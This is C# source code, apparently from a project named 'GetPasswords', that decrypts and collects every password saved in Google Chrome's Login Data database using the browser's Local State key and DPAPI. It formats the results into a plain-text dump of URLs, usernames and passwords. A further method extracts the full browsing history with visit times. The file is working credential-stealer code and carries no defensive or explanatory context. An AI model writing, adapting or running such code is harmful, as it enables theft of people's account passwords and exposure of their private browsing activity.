using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Text;
using System.Security.Cryptography;
using System.IO;
using Newtonsoft.Json;
using System.Data.SQLite;
using Org.BouncyCastle.Crypto.Engines;
using Org.BouncyCastle.Crypto.Modes;
using Org.BouncyCastle.Crypto.Parameters;

namespace GetPasswords
{
    internal class Credential
    {
        public string url { get; set; }
        public string username { get; set; }
        public string password { get; set; }
    }
    public class Chrome
    {
        public static string GetPassword(string localstate,string logindata)
        {

            string data = "null";


            byte[] key = GetKey(localstate);

            string scriptoutputpath = logindata;


            //CONNECTİON OLAYLARI BURDA
            string connectionString = String.Format("Data Source={0};Version=3;", scriptoutputpath);

            SQLiteConnection conn = new SQLiteConnection(connectionString);
            conn.Open();
            List<Credential> creds = new List<Credential>();

            SQLiteCommand cmd = new SQLiteCommand("select * from logins", conn);
            SQLiteDataReader reader = cmd.ExecuteReader();

            while (reader.Read())
            {
                byte[] encryptedData = (byte[])reader["password_value"];
                if (IsV10(encryptedData))
                {
                    byte[] nonce, ciphertextTag;
                    Prepare(encryptedData, out nonce, out ciphertextTag);
                    string password = Decrypt(ciphertextTag, key, nonce);
                    creds.Add(new Credential
                    {
                        url = reader["origin_url"].ToString(),
                        username = reader["username_value"].ToString(),
                        password = password
                    });
                }
                else
                {
                    string password;
                    try
                    {
                        password = Encoding.UTF8.GetString(ProtectedData.Unprotect(encryptedData, null, DataProtectionScope.CurrentUser));
                    }
                    catch
                    {
                        password = "Decryption failed :(";
                    }
                    creds.Add(new Credential
                    {
                        url = reader["origin_url"].ToString(),
                        username = reader["username_value"].ToString(),
                        password = password
                    });
                }
            }

            foreach (Credential cred in creds)
            {
                data += $"----------\nMAIN URL : {cred.url.ToString()}\nUsername : {cred.username.ToString()}\nPassword : {cred.password.ToString()}" + "\nBrowser  : Chrome" + "\n-----------";
            }
            return data;
        }

        static bool IsV10(byte[] data)
        {
            if (Encoding.UTF8.GetString(data.Take(3).ToArray()) == "v10")
            {
                return true;
            }
            else
            {
                return false;
            }
        }

        //Gets the key used for new AES encryption (from Chrome 80)
        static byte[] GetKey(string localstate)
        {
            string localappdata = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
            //LOCAL STATE AL
            string FilePath = localstate;
            string content = File.ReadAllText(FilePath);
            dynamic json = JsonConvert.DeserializeObject(content);
            string key = json.os_crypt.encrypted_key;
            byte[] binkey = Convert.FromBase64String(key).Skip(5).ToArray();
            byte[] decryptedkey = ProtectedData.Unprotect(binkey, null, DataProtectionScope.CurrentUser);

            return decryptedkey;
        }

        //Gets cipher parameters for v10 decryption
        internal static void Prepare(byte[] encryptedData, out byte[] nonce, out byte[] ciphertextTag)
        {
            nonce = new byte[12];
            ciphertextTag = new byte[encryptedData.Length - 3 - nonce.Length];

            System.Array.Copy(encryptedData, 3, nonce, 0, nonce.Length);
            System.Array.Copy(encryptedData, 3 + nonce.Length, ciphertextTag, 0, ciphertextTag.Length);
        }

        //Decrypts v10 credential
        internal static string Decrypt(byte[] encryptedBytes, byte[] key, byte[] iv)
        {
            string sR = string.Empty;
            try
            {
                GcmBlockCipher cipher = new GcmBlockCipher(new AesEngine());
                AeadParameters parameters = new AeadParameters(new KeyParameter(key), 128, iv, null);

                cipher.Init(false, parameters);
                byte[] plainBytes = new byte[cipher.GetOutputSize(encryptedBytes.Length)];
                Int32 retLen = cipher.ProcessBytes(encryptedBytes, 0, encryptedBytes.Length, plainBytes, 0);
                cipher.DoFinal(plainBytes, retLen);

                sR = Encoding.UTF8.GetString(plainBytes).TrimEnd("\r\n\0".ToCharArray());
            }
            catch (Exception)
            {
                return "Decryption failed :(";
            }

            return sR;
        }
        internal static string historydata = "\n";
        internal static string HistoryForDefault
        {
            get
            {
                return historydata;
            }
            private set
            {
                historydata = value;
            }
        }
        public static string ShowChromeHistory(string history)
        {
            try
            {
                string chromeHistoryPath = history;

                string connectionString = $"Data Source={chromeHistoryPath};Version=3;Read Only=True;";

                using (var connection = new SQLiteConnection(connectionString))
                {
                    connection.Open();

                    using (var command = new SQLiteCommand("SELECT * FROM urls", connection))
                    using (var reader = command.ExecuteReader())
                    {
                        while (reader.Read())
                        {
                            string url = reader["url"].ToString();
                            long fileTime = Convert.ToInt64(reader["last_visit_time"]);
                            DateTime lastVisitTime = FromChromeFileTime(fileTime);

                            historydata += " URL : " + url + "\n" + "Last : " + lastVisitTime;
                        }
                        return historydata;
                    }
                }
            }
            catch (Exception ex)
            {
                return "Something went wrong ! " + ex.Message;
                throw;
            }
        }
        private static DateTime FromChromeFileTime(long fileTime)
        {
            try
            {
                const long ticksPerMicrosecond = 10;
                const long epochTicks = 116_444_736_000_000_000;

                long ticks = epochTicks + (fileTime * ticksPerMicrosecond);

                return new DateTime(ticks, DateTimeKind.Utc);
            }
            catch (Exception)
            {
                throw;
            }

        }
    }
}
